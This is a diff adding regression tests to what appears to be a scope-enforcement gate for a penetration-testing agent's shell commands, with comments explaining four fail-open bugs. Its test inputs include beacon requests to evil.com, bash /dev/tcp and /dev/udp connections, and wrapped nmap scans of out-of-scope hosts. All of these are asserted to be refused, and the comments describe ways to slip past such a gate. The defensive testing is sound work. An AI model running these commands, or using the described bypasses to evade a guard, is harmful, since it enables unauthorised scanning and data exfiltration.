@@ -241,5 +241,68 @@ for _junk in ("", "/", "//", "1.2.3.4/99", "::/0", "a/b/c", "/32", "*.acme.com")
     except Exception as _e:
         ck(f"junk is safe: {_junk!r}", False, f"{type(_e).__name__}: {_e}")
 
+
+# ── 7. FOUR MORE FAIL-OPENS, ALL REPRODUCED BEFORE FIXING ────────────
+# Found by reading, not by a failing test — the suite was fully green.
+#
+#  A. `find`, `docker`, `git`, `make`, `go` sat in _TOOL_NAME_CONSUMERS, the
+#     set that means "this head only NAMES a tool" (`which nmap`). They also
+#     EXECUTE what follows, and being on that list skipped both the quoted-arg
+#     recursion and the unattributed-tool backstop.
+#  B. `os.sep in t` treated every token containing "/" as a filename, so a
+#     scheme-less URL disappeared from the extracted set and one in-scope
+#     operand laundered an out-of-scope one.
+#  C. `-f` was in _BOOLEAN_FLAGS *and* _TARGET_FILE_FLAGS, and the file branch
+#     is tested first — so it swallowed the next token. This one is a FALSE
+#     REFUSAL on everyday in-scope work, which is the failure mode that gets a
+#     gate switched off, so it is a security cost too.
+#  D. bash's /dev/tcp/<host>/<port> reaches the network with no binary at all,
+#     and the gate keys entirely off recognising a tool basename.
+print("\n== wrappers that EXECUTE their argument are judged, not skipped ==")
+_S1 = {"scope": ["acme.com"], "exclusions": [], "authorised": True,
+       "window": None}
+for _c in ["find . -exec nmap 8.8.8.8 \\;",
+           "docker run --rm kalilinux/kali nmap -sS 8.8.8.8",
+           "sudo find . -exec masscan 198.51.100.0/24 \\;"]:
+    ck(f"refused: {_c[:52]}",
+       S.check_command(_c, _S1).get("allowed") is False)
+for _c in ["find . -name '*.conf'", "find /etc -type f", "which nmap",
+           "apt-get install -y nmap", "docker ps", "git status"]:
+    ck(f"still allowed: {_c}", S.check_command(_c, _S1).get("allowed") is True)
+
+print("\n== a host token with a path is still a HOST ==")
+for _c in ["curl acme.com evil.com/admin",
+           "curl -s https://acme.com/health evil.com/beacon"]:
+    ck(f"refused: {_c}", S.check_command(_c, _S1).get("allowed") is False)
+for _c in ["curl acme.com/health", "cat logs/app.log", "ls src/main.py",
+           "grep -r x wordlists/big.txt"]:
+    ck(f"still allowed: {_c}", S.check_command(_c, _S1).get("allowed") is True)
+ck("a relative path is not mistaken for a host",
+   S._looks_like_target("wordlists/hosts.txt") is False)
+ck("…nor is a dotted path segment",
+   S._looks_like_target("src/main.py") is False)
+ck("a scheme-less host+path IS a target",
+   S._looks_like_target("evil.com/admin") is True)
+
+print("\n== -f no longer eats the target of ordinary commands ==")
+ck("-f is not a target-file flag", "-f" not in S._TARGET_FILE_FLAGS)
+for _c in ["curl -f https://acme.com/health", "nmap -f acme.com"]:
+    ck(f"ordinary in-scope work runs: {_c}",
+       S.check_command(_c, _S1).get("allowed") is True,
+       str(S.check_command(_c, _S1))[:110])
+ck("…and -f does not launder an out-of-scope host",
+   S.check_command("curl -f https://evil.com/x", _S1).get("allowed") is False)
+ck("real target-file flags still read as uncertain",
+   S.check_command("nmap -iL targets.txt", _S1).get("allowed") is False)
+
+print("\n== bash socket redirection is a network target ==")
+for _c in ["cat < /dev/tcp/evil.com/80", "exec 3<>/dev/tcp/evil.com/80",
+           "printf x > /dev/udp/evil.com/53"]:
+    ck(f"refused: {_c}", S.check_command(_c, _S1).get("allowed") is False)
+ck("an in-scope /dev/tcp host is allowed",
+   S.check_command("cat < /dev/tcp/acme.com/80", _S1).get("allowed") is True)
+ck("prose mentioning /dev/tcp is not a connection",
+   S.check_command("echo /dev/tcp is a bash feature", _S1).get("allowed") is True)
+
 print(f"\nevidence_scope: {_p} passed, {_f} failed")
 sys.exit(1 if _f else 0)
